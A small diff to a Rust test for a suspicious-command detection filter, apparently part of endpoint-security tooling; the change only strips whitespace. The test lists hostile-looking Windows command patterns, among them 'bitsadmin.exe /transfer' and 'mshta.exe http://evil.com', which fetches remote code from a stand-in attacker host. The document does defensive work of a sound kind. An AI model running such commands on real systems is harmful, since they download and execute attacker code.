@@ -15,7 +15,7 @@ fn test_fast_filter_suspicious_patterns() {
     assert!(filter.is_suspicious("cmd.exe /c echo hello"));
     assert!(filter.is_suspicious("bitsadmin.exe /transfer"));
     assert!(filter.is_suspicious("mshta.exe http://evil.com"));
-    
+
     // Test de patterns sains
     assert!(!filter.is_suspicious("C:\\Windows\\System32\\svchost.exe"));
     assert!(!filter.is_suspicious("explorer.exe"));
